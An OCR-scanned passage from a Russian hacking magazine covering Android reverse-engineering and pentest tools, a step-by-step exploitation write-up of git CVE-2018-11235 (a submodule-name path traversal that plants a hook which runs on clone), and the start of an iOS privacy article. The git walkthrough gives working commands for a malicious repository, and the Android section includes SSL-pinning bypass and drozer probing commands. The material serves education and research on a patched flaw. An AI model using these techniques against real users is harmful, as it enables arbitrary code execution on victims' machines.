      можность сделать все самому. В про цес се исполнения код сам расшифрует
     зашифрованные строки, укажет на мес та, которые никогда не будут исполне‐
      ны (обфускация с помощью мертвого кода), и укажет на реальный тип объ‐
       ектов, полученных с помощью рефлексии (а это позволит выполнить дереф‐
       лексию).
         Из‐за особенностей реализации вир туальной машины Simplify редко спо‐
      собен проанализировать все приложение целиком. Поэтому его стоит
      использовать для деобфуска ции отдельных методов и клас сов (это можно
      сделать с помощью флага ‐it):


       $ java ‐jar simplify.jar ‐it 'org/cf/obfuscated' simplify/obfusc
       ated‐app.apk





                       До и после обра ботки Simplify


     DeGuard
        Simplify поможет, если приложение было про пущено через мощ ный обфуска‐
       тор. Однако большинство прог раммистов не обременя ют себя примене нием
       чего‐то более сложного, чем входящий в сос тав Android Studio ProGuard.
      А ProGuard — это оптимизатор, в котором функция обфускации появилась
       как побочный эффект. Единс твенное, чем он запутывает реверсера, —
       это измененные на бессмысленный набор букв имена клас сов, методов
      и полей.
        Разобраться в обфусцированном с помощью ProGuard коде не так уж
      и сложно, но сложнее, чем в совсем не обфусцированном (в два раза слож‐
       нее, если верить исследова ниям). Поэто му даже для ProGuard сущес твуют
      деобфускаторы.
         DeGuard — наиболее интерес ный из них. Это веб‐сервис, созданный
       в Высшей технической школе Цюриха. С помощью ней росетей он способен
      восстановить (а точ нее, предска зать) оригинальные имена пакетов, классов,
      методов и полей. Одна проблема: нередко деоб фусци рованный код запуты‐
       вает еще больше, чем оригинал.





                   Пример деоб фуска ции с помощью DeGuard


      Bytecode Viewer
      А это решение класса «все в одном». Bytecode Viewer сочетает в себе фун‐
      кции Jadx, Apktool и еще нескольких инстру ментов. Он уме ет дизассембли‐
       ровать приложе ния, декомпилировать их с помощью пяти различных движков
      декомпиляции (JD‐Core, Procyon, CFR, Fernﬂower, Krakatau), расшифровывать
       строки с помощью трех движ ков дешифрования, компилировать приложение
      обратно из декомпилированного кода (с помощью Ranino Compiler) и даже
       искать зловредный код!
       Многие реверсеры рекомендуют использовать именно этот инструмент
      для анализа приложений. Их аргумент в том, что любой другой декомпилятор
        (тот же Jadx или популярный JD‐GUI) может сломаться об обфусцированный
      или специальным образом написанный код и просто не покажет его. В то же
      время Bytecode  Viewer, бла года ря наличию сра зу пяти движков деком‐
       пиляции, имеет боль ше шансов декомпилировать такое приложение.
        На самом же деле не все так радужно. Bytecode Viewer — это кое‐как
      работающая сборная солянка из раз личных открытых инструментов. Да, в нем
      множество движков декомпиляции, но, похоже, автор перестал сле дить
       за своим произведением. Текущая версия Bytecode Viewer уже не может
       открыть большинство APK.
         Скриншота не будет по причине неработос пособ ности инс трумента.


     QARK
      Закончим рассказ о статичес ком анализе на инстру менте QARK. Это утилита
      для автоматического поиска уяз вимос тей в приложениях. Достаточно нат‐
       равить ее на нужный APK или каталог с исходниками, и QARK проанализирует
      манифест, декомпилиру ет и проана лизи рует исходники и даже попробует
      создать эксплоит для взло ма приложения с помощью найденных уязвимос‐
        тей.
         Пользоваться QARK очень просто: запускаешь QarkMain.py, отвечаешь
      на несколько вопросов и получаешь отчет в формате HTML в каталоге quark/
      report.
         Как и другие автомати зированные инстру менты, QARK не может точно
      предсказать наличие уязвимос ти, он лишь высказывает предположение о ее
      существовании и дает реверсеру намек, в какую сторону следует копать.
      Поэтому не стоит надеяться, что ты просто установишь QARK и сразу нач‐
      нешь стричь купоны на пентесте приложений. Без матчасти никуда.





                               От чет QARK


     ДИНАМИЧЕСКИЙ АНАЛИЗ
      Статический анализ приложения не всегда позволяет рас крыть все под‐
      робности его поведения. Код может быть зашифрован упаковщиком, при‐
      ложение может докачивать свои компоненты из интерне та, рас шифровывать
       строки только во время исполнения и делать дру гие вещи, которые нельзя
       увидеть, читая код.
       Обнаружить такие вещи можно с помощью динамического анализа, то
       есть запустив приложение на реальном устройстве или в эмуляторе и изучив
       его поведе ние с помощью специальных инс трументов. Именно это, кстати,
      происходит в Google Play, когда раз работчик заливает новую версию при‐
      ложения. Серверы Google запус кают его в виртуаль ной среде и, если при‐
      ложение делает какие‐то неправомерные действия, запрещает его пуб‐
       ликацию.


       Frida
      Начнем с короля всех инстру ментов динамического анализа, трас сировки
      и модификации приложений — с Frida. Это так называемый Dynamic Instru‐
       mentation Toolkit, набор инстру ментов, позволяющих на лету внедрять собс‐
       твенный код в другие приложения. Внедрив код, можно выполнить полную
       трассиров ку приложения, перехватить функции шифрования, записи файлов
      на диск и вообще сделать с приложением все что угодно.
       В «Хакере» уже была подробная статья о Frida, поэтому не будем пов‐
       торяться. Скажем толь ко, что у Frida есть репозиторий с готовыми скриптами,
      которые могут тебе пригодиться:
        • fridantiroot — комплексный скрипт, позволяющий отключить проверки
         на root;
        • Universal Android SSL Pinning Bypass — обход SSL Pinning;
        • dereﬂector — скрипт Frida для дерефлексии Java‐кода (превращения неп‐
         рямых вызовов методов в прямые).


       $ frida ‐‐codeshare pcipolloni/univer
       sal‐android‐ssl‐pinning‐bypass‐with‐frida ‐f com.example.app





                       Трассировка Telegram с помощью Frida


      Objection
        Frida — очень популярный инс трумент. На его основе было создано множес‐
       тво более высокоуровневых утилит. Objection — одна из них. Она позволяет
      внедриться в приложение iOS или Android и провести анализ его приватного
       каталога, памяти, классов, методов, извлечь содержимое базы SQLite, обой‐
       ти SSL‐пиннинг.
         Главное преимущество Objection в том, что она дает возможность «войти»
       в приватный каталог приложения точно так же, как это позволяет сде лать
       устройство с root‐доступом. Но в этом же ее недос таток: большинство задач,
      для которых предназначена Objection, легко реша ются с помощью adb,
      команды sqlite (при наличии root) и общедос тупных скриптов Frida.





                              Консоль Objection


      Inspeckage
       Inspeckage — еще один высокоуровневый инстру мент динамического ана‐
      лиза приложений. У него огромное количес тво возможностей: он может
       получать информацию о полномочиях, активнос тях, контент‐провайдерах
      и сервисах, умеет перехватывать обращения к SQLite, HTTP‐серверам, фай‐
      ловой системе, буферу обмена, крип тографическим функциям, запускать
       активности, подклю чать ся к ContentProvider’aм и выполнять спуфинг мес‐
      тоположения.
        Все это можно сделать, используя удоб ный веб‐интерфейс. Но перед
      этим на смартфоне необходимо получить пра ва root, а затем установить
      Xposed Framework (который как раз и позволяет Inspeckage выполнять перех‐
       ват управления).





                             Главный экран Inspeckage


      Drozer
      На закуску у нас drozer — мощный инс трумент для выпол нения типичных
       задач пентеста приложений. Drozer позволяет получить информацию о при‐
      ложении, запустить его активности, подключиться к ContentProvider’у, отпра‐
       вить сообщения сервису — в общем, сделать все, чтобы вытащить из при‐
      ложения информацию или зас тавить его выполнить то, что нам нужно.
         Типичный воркфлоу drozer выг лядит так. Сна чала получаем информацию
      о приложении:


       dz> run app.package.list
       dz> run app.package.info ‐a com.example.app

      Затем выводим список активнос тей и про буем запустить их (воз можно,
       некоторые из них не дол жны торчать наружу):


       dz> run app.activity.info ‐a com.example.app
       dz> run app.activity.start ‐‐component com.example.app <
       имя_активности>

     Получаем информацию о ContentProvider’ах приложения:


       dz> run app.provider.info ‐a com.example.app
       dz> run scanner.provider.finduris ‐a com.example.app

      Пробуем выудить из них информа цию раз ными способами. Например,
      при помощи прямого запроса данных:


       dz> run app.provider.query content://com.mwr.example.sieve.DBCont
       entProvider/Password/ ‐‐vertical

      Проверяем на наличие уязвимос тей к инъекции и directory traversal:


       dz> run scanner.provider.injection ‐a com.example.app
       dz> run scanner.provider.traversal ‐a com.example.app

     Получаем информацию о сервисах, пробуем запус тить их, пос лать сооб‐
      щения:


       dz> run app.service.info ‐a com.example.app
       dz> run app.service.start ‐‐action <действие> ‐‐component com.
       example.app <имя_компонента>
       dz> run app.service.send com.example.app <имя_компонента> ‐‐msg <
       сообщение>





              Просмотр информации о приложении с помощью drozer


     Одной стро кой
        • Androl4b — образ виртуальной машины с набором перечис ленных в статье
         инструментов;
        • AndroidRE — аналогичный по наз начению образ Docker;
        • LazyDroid — скрипт для упрощения действий, связанных с анализом при‐
        ложений, позволяет установить фла ги отладки и бэкапа приложения,
         пересобрать и подписать приложение, выдернуть с устройства приложе‐
          ние, установленное с помощью Google Play, ско пировать на комп приват‐
        ный каталог приложения, внедрить гаджет Frida в APK;
        • AndroTickler — метаинстру мент ана лиза Android‐приложений, позволя‐
       ющий получить исчерпывающую информацию о приложении, деком‐
         пилировать его, найти строки, URL, компоненты баз данных; плюс дос‐
          тупна интеграция с Frida.




     ВМЕСТО ВЫВОДОВ
     Сегодня у взломщиков приложений для Android нет недостатка в инстру мен‐
        тах. Все уже написано до нас, оста лось только взять и начать это исполь‐
       зовать — так думает большинс тво из тех, кто решил попробовать себя в роли
      реверсера. На самом деле это не так. Ни один из представленных в статье
      инструментов не скажет тебе: «Уяз вимость здесь, используй ее». Они лишь
      сэкономят твое время на том или ином этапе реверса, но най ти уязвимость
      и эксплуатировать ее тебе придется самому, а для этого надо хорошо
       понимать, что ты делаешь.



}
ВЗЛОМ
СМЕРТЕЛЬНЫЙ
 КОММИТ

           ВЫПОЛНЯЕМ
        ПРОИЗВОЛЬНЫЙ КОД
           В КЛИЕНТЕ GIT





                                                 aLLy
                                              ONsec
                                                    @iamsecurity





Думаю, тебе не нужно рассказывать, что такое  git, — он
сегодня  используется  всеми  от  небольших  компаний
до гигантов индус трии. Найденная в нем уязвимость поз‐
воляет злоумышленнику атаковать пользователей, которые
клонировали специально сформированный репозиторий.
Как его формировать? Об этом я сейчас и расскажу.


             INFO

                   Обнаруженные уяз вимости получили идентифика‐
                      торы CVE‐2018‐11233 и  CVE‐2018‐11235. Они
                      присутствуют в сле дующих версиях git:
                  •все версии ниже 2.17.1;
                  •все версии ниже 2.16.4;
                  •все версии ниже 2.14.4;
                  •все версии ниже 2.15.2;
                  •все версии ниже 2.13.7
                  •и другие, более ранние версии.


Наибольший интерес представляет баг CVE‐2018‐11235, который был обна‐
ружен исследователем Этьеном Сталмансом (Etienne Stalmans). Эксплуата‐
ция именно этой уязвимости приводит к самым печальным пос ледстви ям —
выпол нению произвольного кода на машине жертвы. Проб лема была най‐
дена в рамках программы охоты за ошиб ками GitHub и затрагивает функции
обработки имени подмодуля.
   Баг оказался платформо независимым и прекрасно существу ет во всех
основных операционных системах — Windows, macOS и Linux. Список уяз‐
вимых веток приложения обширен, к тому же под угрозой оказались и прог‐
раммы, в которые включена версия Git «из короб ки». В основном это разные
IDE, такие как Visual Studio и Xcode.


СТЕНД
Думаю, описание установки  git на твою машину будет лишней тратой
экранного места. Выбирай удоб ную тебе платформу и качай дистрибутив.
Проследи только, чтобы номер версии входил в чис ло уяз вимых. Я ради раз‐
нообразия буду использовать git для Windows.





                  Уязвимая к CVE‐2018‐11235 версия git


ЧТО ТАКОЕ «ПОДМОДУЛИ»?
Во время разработки постоянно воз никает необходимость задействовать
в своем проекте еще какой‐то проект. Например, допол нительную биб лиоте‐
ку, которая независимо используется в несколь ких дру гих проектах. Чтобы
не плодить копии этой библиотеки и всегда иметь прос тую возможность
обновить ее до последней версии, в git существу ет понятие под модуля (sub‐
module). Подмодули поз воляют содержать один git‐репози торий как под‐
каталог другого. Это дает воз можность кло нировать еще один репозиторий
внутрь проекта, при этом в него по‐прежнему мож но коммитить отдельно.
  Посмотрим, как это сделать. Для начала соз дадим пус той репозиторий.


$ mkdir subvh && cd subvh
$ git init

Допустим, теперь мы хотим использовать в этом проекте крутой словарь
для дирбаста. Загрузим его в качес тве подмодуля:


$ git submodule add git://github.com/Bo0oM/fuzz.txt fuzz

где fuzz — это название папки, куда будет помещен репозиторий. Теперь,
если  заглянуть в git  status, мы увидим,  что появился новый файл
.gitmodules .


$ git status
On branch master
No commits yet
Changes to be committed:
  (use "git rm ‐‐cached <file>..." to unstage)
  new file:   .gitmodules
  new file:   fuzz

Этот конфигурационный файл зада ет соответствие локального пути внутри
проекта с адресом репозитория.


$ cat .gitmodules
[submodule "fuzz"]
    path = fuzz
    url = git://github.com/Bo0oM/fuzz.txt





              Добавление подмодуля в репозиторий

Обрати внимание на заголовок файла: в кавычках ука зывается наз вание под‐
модуля, оно аналогично наз ванию папки, в которую мы его клонировали.
Разумеется, репозиторий может содержать сколь ко угодно подмодулей,
для каждого будет создана отдельная запись в .gitmodules.
  Сам файл находится под версионным контролем вместе с другими твоими
файлами. Он отправляется при выполнении push и загружается при выпол‐
нении pull вместе с остальными файлами проекта.
  Однако, кроме появления .gitmodules, в структуре проекта были сделаны
и другие изменения. Как ты зна ешь, в корне репозитория в папке .git хра‐
нятся служебные файлы. Там можно обнаружить директорию modules с под‐
папкой fuzz. А в ней уже хранится такой же служеб ный каталог .git, только
от нашего подмодуля. В самой папке подмодуля находится файл .git,
в котором указано, по какому пути искать служеб ную директорию.


$ cat fuzz/.git
gitdir: ../.git/modules/fuzz





                  Служебная пап ка .git от подмодуля

Пора закоммитить внесенные изменения.


$ git commit ‐m "Added submodule"

Теперь попробуем клонировать наш свежесоб ранный репозиторий с под‐
модулем.


$ cd ..
$ git clone subvh subtest

Заглядываем в папку fuzz и... не видим там ничего.





          Попытка кло ниро вания репози тория с подмодулем

Дело в том, что для автоматичес кой заг рузки подмодулей во вре мя клониро‐
вания нужно использовать ключ ‐‐recurse‐submodules или просто ‐‐recur‐
sive.


$ git clone subvh subtest ‐‐recursive

Теперь все в порядке и можно переходить к деталям уяз вимости.


$ git clone subvh subtest ‐‐recursive
Cloning into 'subtest'...
done.
Submodule 'fuzz' (git://github.com/Bo0oM/fuzz.txt) registered for
path 'fuzz'
Cloning into 'D:/VisualHack/subtest/fuzz'...
remote: Counting objects: 323, done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 323 (delta 2), reused 0 (delta 0), pack‐reused 317
Receiving objects: 100% (323/323), 1.85 MiB | 943.00 KiB/s, done.
Resolving deltas: 100% (197/197), done.
Submodule path 'fuzz': checked out 'b50734ffa4477b8f7d86bca3f9eed648a
9b83ed7'




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 СМЕРТЕЛЬНЫЙ КОММИТ
               ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
                               В КЛИЕНТЕ GIT





ДЕТАЛИ УЯЗВИМОСТИ
Сначала заглянем в коммит, который пат чит уяз вимость.





            Коммит с пат чем уязвимости CVE‐2018‐11235

В файл submodule‐config.c была добавлена функция check_submodule_‐
name для проверки име ни подмодуля.


submodule-config.c
193: int check_submodule_name(const char *name)
194: {
195:    /* Disallow empty names */
196:    if (!*name)
197:        return ‐1;
...
204:    goto in_component; /* always start inside component */
205:    while (*name) {
206:        char c = *name++;
207:        if (c == '/' || c == '\\') {
208: in_component:
209:            if (name[0] == '.' && name[1] == '.' &&
210:                (!name[2] || name[2] == '/' || name[2] == '\\'))
211:                return ‐1;
212:        }
213:    }
214:
215:    return 0;
216: }

Она вызывается во время работы скрипта git‐submodule.sh, чтобы обра‐
ботать название, переданное в виде аргу ментов командной строки.


git-submodule.sh
232:    if ! git submodule‐‐helper check‐name "$sm_name"
233:    then
234:        die "$(eval_gettext "'$sm_name' is not a valid submodule
name")"
235:    fi


/builtin/submodule--helper.c
1825: static int check_name(int argc, const char **argv, const char *
prefix)
1826: {
1827:   if (argc > 1) {
1828:       while (*++argv) {
1829:           if (check_submodule_name(*argv) < 0)
1830:               return 1;
1831:       }
1832:   } else {
1833:       struct strbuf buf = STRBUF_INIT;
1834:       while (strbuf_getline(&buf, stdin) != EOF) {
1835:           if (!check_submodule_name(buf.buf))
1836:               printf("%s\n", buf.buf);
1837:       }
1838:       strbuf_release(&buf);
1839:   }
1840:   return 0;
1841: }

Также check_submodule_name вызывается в функции name_and_item_from_‐
var, которая занимается обра бот кой имени подмодуля из конфигурацион‐
ного файла.


submodule-config.c
218: static int name_and_item_from_var(const char *var, struct strbuf
 *name,
219:                  struct strbuf *item)
220: {
221:    const char *subsection, *key;
222:    int subsection_len, parse;
223:    parse = parse_config_key(var, "submodule", &subsection,
224:            &subsection_len, &key);
225:    if (parse < 0 || !subsection)
226:        return 0;
227:
228:    strbuf_add(name, subsection, subsection_len);
229:    if (check_submodule_name(name‐>buf) < 0) {
230:        warning(_("ignoring suspicious submodule name: %s"), name
‐>buf);
231:        strbuf_release(name);
232:        return 0;
233:    }
234:
235:    strbuf_addstr(item, key);
236:
237:    return 1;
238: }

Теперь вернемся к соз данию подмодуля. Как ты помнишь, его название
в секции [submodule] было таким же, как и наз вание папки, где он хранится.
Но это только до тех пор, пока мы вручную не укажем его название
с помощью ключа ‐‐name.


$ git submodule add ‐‐name "test" git://github.com/Bo0oM/fuzz.txt
fuzz

Теперь заглянем в .gitmodules.


$ cat .gitmodules
[submodule "test"]
    path = fuzz
    url = git://github.com/Bo0oM/fuzz.txt

А теперь кое‐что поинтерес нее. Глянем листинг директории .git/modules.





  Листинг дирек тории .git/modules пос ле использования кастомного име‐
  ни подмодуля

Путь, по которому располага ются фай лы подмодуля, остался тем же, а вот
служебная папка теперь имеет название, которое мы указали в параметре
name.
  Отталкиваясь от добавленных про верок в теле пропатченной функции
check_submodule_name, рискнем предположить, что тут имеет место уяз‐
вимость path traversal. Проверим это умозаключение, указав в качес тве наз‐
вания подмодуля ../test.





                      Path traversal в имени подмодуля

Да, уязвимость присутству ет, и папка со служеб ными файлами подмодуля
теперь находится не в поддиректории modules, а в .git нашего репозитория.
Теперь, манипулируя параметром name, мы можем менять мес тоположение
служебной папки подмодуля. Что же это нам может дать, кроме возможности
перезаписать какие‐то данные?


ХУКИ В GIT
Git  предоставляет  возможность  запус кать  поль зовательские  скрипты
при  выполнении  определенных  важных  действий  с  репозитори ем.
В инфраструктуре git это называется хуками (git hooks). Существует два вида
хуков: на стороне клиента и на стороне сервера. Клиентские хуки ини‐
циируются такими операциями, как commit и merge, в то вре мя как серверные
обработчики выпол няются при сетевых взаимодей ствиях, например получе‐
нии запушенных коммитов.
  Все хуки хранятся в поддиректории hooks каталога .git. Когда ты ини‐
циализируешь новый репозиторий с помощью git init, каталог с хуками
содержит вязанку скриптов‐примеров c рас ширением .sample. По сути,
хуки — это простые шелл‐скрипты со специальными названиями, соответс‐
твующими операциям. Например, pre‐commit.





                    Примеры фай лов с хуками

Так как хуки находятся непос редственно в служеб ной папке .git, то, разуме‐
ется, они никогда не вклю чаются в репозиторий, не явля ются его частью и не
передаются при клонировании с помощью git clone. Это логичная прак‐
тика: если бы хуки были частью репози тория, то можно было бы просто соз‐
дать репозиторий, после кло нирования которого у клиента выполнялся бы
произвольный код.
  Подмодули — это обычные внешние репозитории, а значит, они тоже
содержат  хуки, которые по умолчанию рас полагаются  в папке .git/
modules/<имя_подмодуля>/hooks. Но ведь у нас есть path traversal! ;)


Тернистый путь к RCE
C помощью найденной уязвимости мы можем служебную папку подмодуля
превратить в часть репозитория, и она будет вмес те с ним путешес твовать
во время работы и при пос ледующем клонировании.


$ git submodule add ‐‐name "../../fuzz.git" git://github.com/Bo0oM/
fuzz.txt fuzz

После выполнения такой команды в корне репози тория, помимо директории
самого подмодуля, появляется его служебная папка. Теперь можно добав‐
лять хуки в fuzz.git/hooks.





    Переносим служебную папку .git подмодуля в корень репозитория

Создадим хук post‐checkout, который будет выполняться после команды
checkout, в том числе и после клонирования репози тория.


$ echo ‐e '#!/bin/bash\nuname ‐a' > fuzz.git/hooks/post‐checkout
$ chmod +x !$
$ git add .
$ git commit ‐m "message"
$ git push origin master





              Коммитим кастомный хук в репозиторий

И этого для машин на Windows дос таточно. Если теперь клонировать соз‐
данный репозиторий, мы увидим результат выпол нения команды uname ‐a.
Это работает как при клонировании с git clone subvh subtest ‐‐recur‐
sive, так и через git submodule update ‐‐init.





       Выполнение произволь ного кода в версии git для Windows

А вот на системах с Linux такой фокус не пройдет. При попытке клонировать
репозиторий на этапе загрузки подмодулей будет выдана ошибка: папка
для служебных файлов подмодуля уже существу ет.





           Неудача при попытке экс плуата ции git под Debian

К тому же во время кло ниро вания вся директория будет перезаписана, и наш
хук не отработает.





      Перезапись содержимого служебной директории подмодуля

Но Этьен нашел способ избежать этого. Байпас оказался простым, но не
самым оче видным. Помог счас тливый случай! Нужно лишь добавить еще один
подмодуль, причем с таким наз ванием, чтобы оно было первым при сор‐
тировке в алфавитном порядке. В нашем случае это может быть, например,
ааа.


$ git submodule add git://github.com/Bo0oM/fuzz.txt aaa

Подойдет любой подмодуль. Главное тут — название. Когда в папке .git/
modules уже существует какой‐нибудь подмодуль,  git считает любой путь
валидным при последующей инициализации дру гих подмодулей, и переза‐
пись директории не происходит. Это отличная новость, так как теперь наш хук
прекрасно себя чувствует и выполняется.





                  Успешная эксплуата ция git на Linux


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Вот такая интересная, изящная и очень опас ная уяз вимость существовала
во всеми любимом клиенте git. Еще одно доказа тельство того, что популяр‐
ность продукта совсем не означает отсутс твия в нем уязвимостей. Даже если
исследователи засмотрели что‐то до дыр, у тебя всегда есть шанс найти
что‐то новое и утереть им нос.
   Кстати, на момент написания статьи GitHub запретил пушить репозитории,
в которых есть модули, содержащие наз вания хуков. Заботятся о нашей
безопасности! :)
    ПРИВАТНОСТЬ
   БЕЗ ОПАСНОСТЬ
   IOS

                          ЧТО ХОРОШО,
                            ЧТО ПЛОХО
                     И КАК ЕЕ УСИЛИТЬ





                                                                Олег Афонин
                                                                      Эксперт по мобильной
                                                                    криминалистике компании
                                                                        «Элкомсофт»
                                                                            aoleg@voicecallcentral.com





    Сегодняшняя статья будет несколько необычной. Чаще все‐
     го мы говорим о найденных уязвимостях и способах их
     использования,   помогающих    взло мать    устройство
     и получить доступ к информации. Теперь же мы попытаемся
     обернуть ситуацию в пользу владельца устройства с iOS.
     Рассмотрим способы, которыми пользуются спецслужбы
     и  полицейские,  чтобы  взло мать  iPhone,  и  способы,
     при помощи которых извлекаются твои дан ные; попробуем
     от них защититься и сразу же оценить стойкость такой
     защиты. Основная тема статьи — как уберечь данные, если
     пароль блокировки твоего iPhone стал известен злоумыш‐
     леннику.


      IOS ДОСТАТОЧНО БЕЗОПАСНА
     Мы уже неоднократно писали о модели безопас ности современных версий
       iOS. Если  говорить о  свежих сборках системы  (на  сегодня  это iOS
       11.4 в качестве официального релиза, 11.4.1 бета 3 в качестве публичной
       бета‐версии и iOS 12.0 в качестве беты для раз работчиков), можно похвалить
      образцовую реализацию шифрования данных и отличную защиту криптогра‐
      фического ключа (напомним, он вычис ляется динамически в процес се заг‐
       рузки на основе пароля блокировки, а во время работы надежно защищен
      сопроцессором Secure Enclave). Также похвалим допол нительный уровень
      защиты связки ключей keychain, в которой хра нятся все пароли к учетным
      записям Safari, маркеры аутентифика ции и криптогра фичес кие ключи. Если ты
       установил пароль блокировки, сос тоящий из шес ти цифр, или еще более
       стойкий буквенно‐цифровой пароль, расшифровать что бы то ни было с вык‐
      люченного телефона ока жется невозможно, даже если будет извлечена мик‐
      росхема памяти.


     РЕЗЕРВНЫЕ КОПИИ: ЕЩЕ БЕЗОПАСНЕЕ
      Система резервного копирования iOS достойна всяческого подражания.
     Именно она, а не стеклянные корпуса или вырез в экране, в котором все рав‐
      но не будет модуля объемного ска нирования лица. Шиф рование локальных
      резервных копий в iOS 10.2 и более новых настолько стойкое, что даже
      топовый акселератор Nvidia GTX 1080 демонстри рует скорость перебора
      не выше сотни паролей в секунду. Таким обра зом, нес ложный пароль всего
       из семи знаков (это среднее по больнице) загрузит единс твенный компьютер
      на ближайшее тысячелетие. Вплоть до выхода iOS 11 можно было назначить
      на резервную копию длинный случайный пароль, который обес печил бы
      работой все компьютеры мира до скончания веков.


    …НО ЭТО НЕ ИМЕЕТ ЗНАЧЕНИЯ
     С такой безопасной iOS и такими безопасными резервны ми копиями о чем
     еще можно говорить? Дос таточно отнести денеж ки в ближай ший Apple Store,
      не забыть про шестизначный пароль блокировки и наслаждаться безопас‐
       ностью, так?
         Как показывает практика, целую бочку меда можно испортить всего одной
      ложкой дегтя. И эта ложка здесь — тот самый код блокировки. Мы уже под‐
      робно писали о том, что можно сделать с iPhone, если узнать этот код.
      Напомним тезисно:
        • отключить Find my iPhone и блокировку Activation Lock;
        • вклю чить двухфакторную аутентифика цию, если она не была включена;
        • сменить пароль от Apple ID / iCloud; с этим паролем получить дос туп
           к облачным резервным копиям, син хронизированным данным и паролям
         из облачной связки ключей iCloud Keychain, причем со всех устройств,
         привязанных к данной учетной записи;
        • скачать фотографии из iCloud Photo Library (вспомнили Celebgate);
        • заблокировать или удалить данные с дру гих устройств, привязанных к дан‐
         ному Apple ID;
        • сбросить пароль на локальную резервную копию, под ключить телефон
           к компьютеру и извлечь все данные;
        • извлечь все пароли из связ ки клю чей или просмотреть их на самом
         устройстве.


     ПЕРЕХОД IOS ОТ МНОГОСЛОЙНОЙ ЗАЩИТЫ К ОБОРОНЕ ПАРОЛЯ
      Тебе не кажется, что как‐то многова то всего нехорошего можно сделать в iOS
       11 (и в iOS 12 бета, мы проверяли), просто узнав пароль блокировки телефо‐
      на? К примеру, если тебе в руки попадет телефон с Android и будет известен
      код блокировки, просто так сменить пароль от учетной записи Google ты
      не сможешь. Хотя… если ты прос мотришь пароли в Chrome (Chrome → Set‐
        tings → Passwords), там и пароль от учетки Google может оказаться. Да и отвя‐
       зать телефон от FRP (Factory Reset Protection) все‐таки можно, так что о том,
      чей подход более безопасен, можно пос порить.
        Тем не менее возвращаться к испытанной мно гослойной защите в Apple
      не собираются. Вместо этого компания при лагает все возможные усилия
      для защиты того единственного, что осталось: пароля блокировки. Насколько
      успешно это выходит? Пока что не очень.
        Для всех устрой ств iPhone и iPad существу ет как минимум два работающих
      независимых решения, позволяющих взломать код блокировки методом
      перебора. Эти решения — Cellebrite и GrayKey — доступны исключительно
      полиции и спецслужбам, но однажды найденная уязвимость рано или поздно
       окажется в руках не столь чистоплот ных.
      О решениях двух компаний официально известно мало. Неофициально же
       ситуация довольно интересна. Так, GrayKey прекрасно отрабаты вает на всех
       устройствах под управлением iOS 11.3.1 и более ранних версий, при условии,
       что взламываемый телефон был хотя бы раз раз блокирован после включения
      или перезагрузки. В таких случаях перебор идет очень быстро, и код бло‐
      кировки из четырех цифр будет взло ман в течение максимум одной недели.
      Значит ли это, что код бло кировки, состоящий из шес ти цифр, будет взломан
      максимум через сто недель? Нет, не зна чит: из‐за аппаратных ограничений
      с такой скоростью можно перебрать только 300 тысяч комбинаций из 10 мил‐
       лионов. После это го перебор будет дос тупен лишь в «медленном» режиме.
        «Медленный» режим перебора позволяет делать попытки с интервалом
       в десять минут. Именно с такой ско ростью решение компании Grayshift будет
      перебирать пароли на устройствах, которые были выключены или перезаг‐
      ружены (и ни разу после этого не раз блокированы). Более того, начиная с iOS
        11.4 «медленный» режим перебора — единс твенное, что доступно и для
      ранее разблокированных устройств. Больше двух месяцев на взлом пароля
       из четырех цифр и почти девят надцать лет для пол ного перебора пространс‐
       тва паролей из шести цифр вроде бы вполне удовлетворительные показа‐
       тели.
        Но не с точки зрения Apple.


     USB RESTRICTED MODE
      Казалось бы, код блокировки из шести цифр уже достаточная гарантия
      безопасности данных. Девятнадцать лет на пол ный перебор пространства
      паролей — это немало. Одна ко и компании, пытающиеся взломать iOS,
      не сидят сложа руки. И если сегодня им дос тупен лишь медленный перебор,
       то нет никакой гарантии, что завтра они не сделают то же самое, но в разы
      быстрее.  Отчаявшись  защитить  свои  устройства  от  эксплу атируемых
        Cellebrite и Grayshift уязвимостей, в Apple решились на отчаянный шаг, выз‐
      вавший бурную неоднозначную реакцию со стороны как журналис тов, так
      и правоохранительных орга нов.
      О новом режиме USB Restricted Mode, который то появлялся, то исчезал,
       то снова появлялся в бета‐версиях iOS, на сегодняшний день не написал
      лишь ленивый. В двух словах: режим USB Restricted Mode полностью отклю‐
       чает любой обмен данными через встро енный в устройство порт Lightning.
      Единственное, что остается доступным, — зарядка; с точки зре ния компьюте‐
       ра, к которому будет подключен iPhone с активировавшимся режимом USB
        Restricted Mode, устрой ство ничем не будет отличать ся от, к при меру, внеш‐
       него аккумулятора.
         Активируется этот режим так:





       Не перепутай! Режим USB Restricted Mode активируется при «выключен‐
        ном» положении переключателя USB Accessories

      Компьютер при этом не видит ничего: недос тупна даже базовая информация
      об устройстве (такая как модель, серийный номер и версия iOS). Само же
       устройство покажет вот такое всплывающее уведомление:





                    Телефон теперь пот ребуется разблокировать

     В текущей реализации режим USB Restricted Mode появился в iOS далеко
      не сразу. Если в бета‐версиях iOS 11.3 этот режим активировал ся спустя
      семь дней с момента последней раз блокировки устройства, то в iOS 11.4.1
       beta (а также в пер вой тестовой сборке iOS 12) USB‐порт отключается спустя
      всего час. Таким образом, если ты не раз блокировал телефон в течение часа
        (и  не  подключал  его  к  доверенному  устрой ству), решение  Cellebrite
      или GrayKey для взло ма пароля не смо жет работать: оно попросту не увидит
       телефон.
        Режим USB Restricted Mode достаточно надежен: телефон по‐прежнему
       откажется общаться с компь ютером, даже если его перезагрузить. Если
      перевести iPhone в режим Recovery или DFU, он становится доступен
      с компьютера, но перебор паролей в этих режимах невозможен. Мы пытались
       «восстановить» телефон, залив на него свежую прошивку, — но даже это не
      помогло отключить USB Restricted Mode пос ле перезагрузки в сис тему.
          Итак, Apple пытается защитить твой пароль от взлома. Но что, если зло‐
     умышленник подсмотрел пароль блокировки или вынудил тебя его сообщить?
      Даже тогда положение далеко от безвыходного.


     ОГРАНИЧЕНИЯ РОДИТЕЛЬСКОГО КОНТРОЛЯ: ТОТ САМЫЙ
    ДОПОЛНИТЕЛЬНЫЙ УРОВЕНЬ ЗАЩИТЫ
      Если твой телефон уже попал в руки к спецслужбам или украден, делать
       что‐либо, помимо бло кировки через iCloud, поздно. И даже блокировка
      не особо поможет: зная пароль бло кировки телефона, злоумышленник смо‐
      жет как минимум сбросить пароль на резервную копию, извлечь пароли
       от твоих социальных сетей и почтовых сервисов. Час тично защититься
